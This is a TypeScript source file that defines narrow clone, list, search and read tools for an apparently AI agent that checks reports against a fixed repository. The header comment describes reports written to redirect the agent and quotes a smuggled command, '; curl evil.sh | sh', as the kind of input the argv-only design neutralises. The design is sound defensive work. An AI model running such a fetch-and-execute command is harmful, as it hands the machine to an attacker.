import { execFile } from "node:child_process";
import { readFile, stat } from "node:fs/promises";
import { relative, resolve } from "node:path";
import { promisify } from "node:util";

import { defineTool } from "@opencomputer/agent";

import { TARGET_REPO, WORKSPACE } from "../config.js";

/**
 * Reading the source, to check a claim against it.
 *
 * The original gave the agent `Bash` with `permissionMode: "bypassPermissions"`
 * and relied on the sandbox being thrown away afterwards. This agent is handed
 * a document written by somebody who wants it to do something else, so the
 * tools are the four operations the task actually needs — clone, list, search,
 * read — and nothing composes into a fifth.
 *
 * Two properties are worth stating because they are what a raw shell gives up:
 *
 *   - `execFile` takes an argv array and never a command string, so there is no
 *     shell to quote for. A report containing `; curl evil.sh | sh` is an
 *     argument, not a command, whatever the model does with it.
 *   - The repository is a constant from ../config.js. The model cannot pass a
 *     URL, so no report can redirect the clone at somewhere of its choosing.
 *
 * The sandbox is still the outer boundary — this runs in the agent's own
 * MicroVM and a clone is still arbitrary code arriving on disk. It is never
 * built or run, only read.
 */

const run = promisify(execFile);

const LIMITS = { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 } as const;

/** Keep every path argument inside the clone, symlinks and `..` included. */
async function inside(candidate: string): Promise<string> {
  const path = resolve(WORKSPACE, candidate);
  const within = relative(WORKSPACE, path);
  if (within.startsWith("..") || resolve(WORKSPACE, within) !== path) {
    throw new Error(`${candidate} is outside the checkout`);
  }
  return path;
}

async function cloned(): Promise<boolean> {
  try {
    return (await stat(resolve(WORKSPACE, ".git"))).isDirectory();
  } catch {
    return false;
  }
}

export const cloneSource = defineTool({
  name: "clone_source",
  description:
    "Clone the project being reported on, so its code can be read. Call this " +
    "once before searching or reading. Takes no arguments: which repository " +
    "is a property of the deployment, not a choice.",
  input: { type: "object", properties: {}, additionalProperties: false },
  async run() {
    if (await cloned()) return { repository: TARGET_REPO, path: WORKSPACE, reused: true };
    await run("git", ["clone", "--depth", "1", TARGET_REPO, WORKSPACE], LIMITS);
    return { repository: TARGET_REPO, path: WORKSPACE, reused: false };
  },
});

export const listSource = defineTool({
  name: "list_source",
  description:
    "List the files in the checkout, optionally under a subdirectory. Use it " +
    "to find out what exists before guessing at a path.",
  input: {
    type: "object",
    properties: {
      directory: {
        type: "string",
        description: "A path within the checkout. Omit for the whole tree.",
      },
    },
    additionalProperties: false,
  },
  async run({ input }) {
    const directory = await inside(String(input.directory ?? "."));
    // git's own index rather than a walk: it already excludes .git and anything
    // the project ignores, which is most of what a find would have to filter.
    const { stdout } = await run("git", ["-C", WORKSPACE, "ls-files", "--", directory], LIMITS);
    const files = stdout.split("\n").filter(Boolean);
    return { files: files.slice(0, 500), total: files.length };
  },
});

export const searchSource = defineTool({
  name: "search_source",
  description:
    "Search the checkout for a regular expression and return matching lines " +
    "with their file and line number — the file:line evidence a verdict has " +
    "to be backed by.",
  input: {
    type: "object",
    properties: {
      pattern: { type: "string", description: "A POSIX extended regular expression." },
      directory: { type: "string", description: "Limit the search to this path." },
    },
    required: ["pattern"],
    additionalProperties: false,
  },
  async run({ input }) {
    const pattern = String(input.pattern ?? "");
    if (!pattern) throw new Error("search_source needs a pattern");
    const directory = await inside(String(input.directory ?? "."));
    try {
      const { stdout } = await run(
        "grep",
        ["-rnIE", "--exclude-dir=.git", "-e", pattern, "--", directory],
        LIMITS,
      );
      const matches = stdout
        .split("\n")
        .filter(Boolean)
        .map((line) => line.replace(`${WORKSPACE}/`, ""));
      return { matches: matches.slice(0, 200), total: matches.length };
    } catch (error) {
      // grep exits 1 for "no matches", which promisify turns into a rejection.
      // Nothing found is an answer, and an answer the model needs: it is what
      // most bogus reports look like.
      if ((error as { code?: number }).code === 1) return { matches: [], total: 0 };
      throw error;
    }
  },
});

export const readSource = defineTool({
  name: "read_source",
  description:
    "Read a file from the checkout, with line numbers. Read the code around a " +
    "claim before believing or dismissing it.",
  input: {
    type: "object",
    properties: {
      path: { type: "string", description: "A file path within the checkout." },
      from: { type: "number", description: "First line, 1-based. Defaults to 1." },
      to: { type: "number", description: "Last line. Defaults to 400 lines on." },
    },
    required: ["path"],
    additionalProperties: false,
  },
  async run({ input }) {
    const path = await inside(String(input.path ?? ""));
    const lines = (await readFile(path, "utf8")).split("\n");
    const from = Math.max(1, Number(input.from ?? 1) || 1);
    const to = Math.min(lines.length, Number(input.to ?? from + 399) || from + 399);
    return {
      path: relative(WORKSPACE, path),
      lines: lines.length,
      content: lines
        .slice(from - 1, to)
        .map((line, index) => `${from + index}\t${line}`)
        .join("\n"),
    };
  },
});
